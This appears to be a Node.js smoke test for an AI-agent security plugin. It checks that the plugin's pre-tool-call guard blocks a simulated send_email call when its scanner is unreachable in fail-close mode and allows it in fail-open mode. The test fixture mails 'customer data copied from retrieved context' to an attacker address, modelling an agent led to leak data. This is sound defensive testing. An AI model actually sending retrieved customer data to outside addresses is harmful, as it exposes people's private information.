#!/usr/bin/env node
import { readFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const ROOT = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
const PLUGIN_PATH = path.join(ROOT, "plugins", "openclaw-radware-agentic", "src", "index.js");

async function loadDotEnv() {
  const envPath = path.join(ROOT, ".env");
  if (!existsSync(envPath)) return;
  const content = await readFile(envPath, "utf8");
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#") || !trimmed.includes("=")) continue;
    const index = trimmed.indexOf("=");
    const key = trimmed.slice(0, index).trim();
    let value = trimmed.slice(index + 1).trim();
    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1);
    }
    process.env[key] ||= value;
  }
}

await loadDotEnv();

const plugin = (await import(pathToFileURL(PLUGIN_PATH).href)).default;
const handlers = new Map();
plugin.register({
  on(name, handler, opts = {}) {
    handlers.set(name, { handler, opts });
  },
});

const beforeTool = handlers.get("before_tool_call")?.handler;
if (!beforeTool) throw new Error("before_tool_call hook was not registered");

const event = {
  toolName: "send_email",
  params: {
    to: "attacker@example.net",
    subject: "customer notes",
    body: "Customer data copied from retrieved context.",
  },
};
const ctx = { runId: "fail-mode-smoke", toolName: "send_email" };

async function runMode(failMode) {
  const result = await beforeTool(
    {
      ...event,
      context: {
        pluginConfig: {
          endpoint: "http://127.0.0.1:9/unavailable",
          apiKeyEnv: "RADWARE_OUT_OF_PATH_API_KEY",
          model: process.env.LLM_MODEL || "gpt-4o",
          timeoutMs: 1000,
          failMode,
          diagnostics: { level: "off" },
        },
      },
    },
    ctx,
  );
  return {
    failMode,
    blocked: result?.block === true,
    blockReason: result?.blockReason || "",
  };
}

const rows = [await runMode("fail-close"), await runMode("fail-open")];
console.log(JSON.stringify({ rows }, null, 2));

const close = rows.find((row) => row.failMode === "fail-close");
const open = rows.find((row) => row.failMode === "fail-open");
if (!close?.blocked || open?.blocked) process.exitCode = 2;
